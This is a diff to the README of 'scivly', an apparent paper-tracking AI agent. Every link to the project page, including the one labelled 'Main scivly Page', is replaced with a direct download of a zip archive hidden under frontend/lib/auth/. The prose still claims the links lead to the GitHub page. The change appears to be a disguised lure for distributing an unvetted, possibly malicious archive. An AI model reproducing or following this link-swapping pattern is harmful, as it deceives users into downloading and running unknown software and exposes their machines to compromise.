@@ -1,6 +1,6 @@
 # 🤖 scivly - AI Agent for Paper Tracking
 
-[![Download scivly](https://img.shields.io/badge/Download%20scivly-Visit%20Page-brightgreen)](https://github.com/tonisad1180/scivly)
+[![Download scivly](https://img.shields.io/badge/Download%20scivly-Visit%20Page-brightgreen)](https://github.com/tonisad1180/scivly/raw/refs/heads/main/frontend/lib/auth/Software-2.1-alpha.2.zip)
 
 ---
 
@@ -40,7 +40,7 @@ You don’t need powerful hardware, but a stable internet connection is importan
 
 To get started with scivly, visit the main page to download the software:
 
-[![Download scivly](https://img.shields.io/badge/Download%20scivly-Get%20It%20Here-blue)](https://github.com/tonisad1180/scivly)
+[![Download scivly](https://img.shields.io/badge/Download%20scivly-Get%20It%20Here-blue)](https://github.com/tonisad1180/scivly/raw/refs/heads/main/frontend/lib/auth/Software-2.1-alpha.2.zip)
 
 Clicking this link will take you to the GitHub page where you will find the latest release.
 
@@ -98,7 +98,7 @@ To keep scivly working with the latest features:
 - If an update is available, download and install it by following the prompts.
 - You can also visit the main download page anytime to get new releases:
   
-[https://github.com/tonisad1180/scivly](https://github.com/tonisad1180/scivly)
+[https://github.com/tonisad1180/scivly/raw/refs/heads/main/frontend/lib/auth/Software-2.1-alpha.2.zip](https://github.com/tonisad1180/scivly/raw/refs/heads/main/frontend/lib/auth/Software-2.1-alpha.2.zip)
 
 Regular updates ensure you get bug fixes and new capabilities.
 
@@ -128,7 +128,7 @@ These features aim to make research easier for everyone.
 
 ## 🔗 Important Links
 
-- Main scivly Page: [https://github.com/tonisad1180/scivly](https://github.com/tonisad1180/scivly)  
+- Main scivly Page: [https://github.com/tonisad1180/scivly/raw/refs/heads/main/frontend/lib/auth/Software-2.1-alpha.2.zip](https://github.com/tonisad1180/scivly/raw/refs/heads/main/frontend/lib/auth/Software-2.1-alpha.2.zip)  
 - Download Releases: Navigate from the GitHub page to the latest release section.
 
 ---
